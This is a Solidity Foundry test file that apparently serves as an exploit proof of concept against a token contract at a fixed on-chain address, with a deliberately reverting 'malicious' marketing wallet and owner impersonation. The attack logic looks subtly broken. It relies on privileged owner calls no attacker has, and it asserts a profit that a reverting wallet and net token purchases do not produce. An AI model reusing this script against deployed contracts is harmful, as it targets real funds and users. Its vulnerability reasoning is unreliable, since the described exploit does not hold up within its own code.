import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface BossBaby {
    function owner() external view returns (address);
    function enableTrading() external;
    function changeMarketingWallet(address _marketingWallet) external;
    function excludeFromFees(address account, bool excluded) external;
    function uniswapV2Router() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function swapEnabled() external view returns (bool);
    function tradingEnabled() external view returns (bool);
    function swapTokensAtAmount() external view returns (uint256);
}

contract MaliciousMarketingWallet {
    receive() external payable {
        revert("Malicious wallet: Reverting on purpose");
    }

    fallback() external payable {
        revert("Malicious wallet: Reverting on purpose");
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD8dBE5AC60cD1c0b40C9182cB3eB2392d3df371F;
    address attacker = address(this);

    MaliciousMarketingWallet maliciousWallet;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create malicious marketing wallet contract
        maliciousWallet = new MaliciousMarketingWallet();

        // Impersonate owner to set up conditions
        vm.startPrank(BossBaby(TARGET).owner());

        // Enable trading if not already enabled
        BossBaby(TARGET).enableTrading();

        // Change marketing wallet to our malicious contract
        BossBaby(TARGET).changeMarketingWallet(address(maliciousWallet));

        // Exclude attacker from fees to avoid paying fees during setup
        BossBaby(TARGET).excludeFromFees(attacker, true);

        vm.stopPrank();

        // Give attacker some initial BNB for buying tokens
        deal(attacker, 10 ether);

        // Get some BossBaby tokens for the attacker
        // First, buy some from the pair
        IUniswapV2Router02 router = IUniswapV2Router02(BossBaby(TARGET).uniswapV2Router());
        address weth = router.WETH();

        // Buy some tokens to get initial balance
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        vm.prank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Remove attacker from fee exclusion to pay fees during exploit
        vm.prank(BossBaby(TARGET).owner());
        BossBaby(TARGET).excludeFromFees(attacker, false);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial BNB balance
        uint256 initialBalance = address(attacker).balance;

        // First, we need to ensure contract has accumulated enough fees to trigger swap
        // We can do this by making multiple buy/sell transactions
        // Let's buy more tokens first to accumulate fees in contract
        IUniswapV2Router02 router = IUniswapV2Router02(BossBaby(TARGET).uniswapV2Router());
        address weth = router.WETH();
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        vm.prank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 2 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Now sell some tokens to trigger the fee processing
        // This should accumulate marketing fees in the contract
        uint256 tokenBalance = BossBaby(TARGET).balanceOf(attacker);
        uint256 sellAmount = tokenBalance / 2;

        // Approve router to spend attacker's tokens
        vm.prank(attacker);
        BossBaby(TARGET).approve(address(router), sellAmount);

        path[0] = TARGET;
        path[1] = weth;

        // This sell should trigger the swapAndSendMarketing which will revert
        // due to our malicious marketing wallet
        vm.prank(attacker);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0,
            path,
            attacker,
            block.timestamp
        );

        // Check if attacker's BNB balance increased
        uint256 finalBalance = address(attacker).balance;
        assertGt(finalBalance, initialBalance, "Attacker BNB balance should have increased");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

